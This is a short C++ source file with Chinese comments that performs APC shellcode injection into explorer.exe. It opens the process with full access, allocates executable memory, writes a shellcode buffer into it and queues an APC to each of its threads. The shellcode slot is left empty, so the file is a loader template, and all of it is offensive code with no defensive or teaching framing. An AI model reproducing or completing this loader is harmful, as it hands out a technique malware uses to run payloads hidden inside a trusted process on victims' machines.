#include <windows.h>
#include <tlhelp32.h>
#include <vector>



int main()
{
    // 1. 定义shellcode
    UINT shellcodeSize = 0;
    unsigned char* shellcode = "";

    // 2. 获取 explorer 进程句柄，分配 shellcode 的内存
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };

    if (Process32First(snapshot, &processEntry))
    {
        while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0)
        {
            Process32Next(snapshot, &processEntry);
        }
    }

    HANDLE victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 3. 执行 shellcode
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);

    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    std::vector<DWORD> threadIds;

    if (Thread32First(snapshot, &threadEntry))
    {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
            {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    for (DWORD threadId : threadIds)
    {
        HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
        QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
        Sleep(1000 * 2);
    }

    // 释放资源
    CloseHandle(victimProcess);
    CloseHandle(snapshot);

    return 0;
}
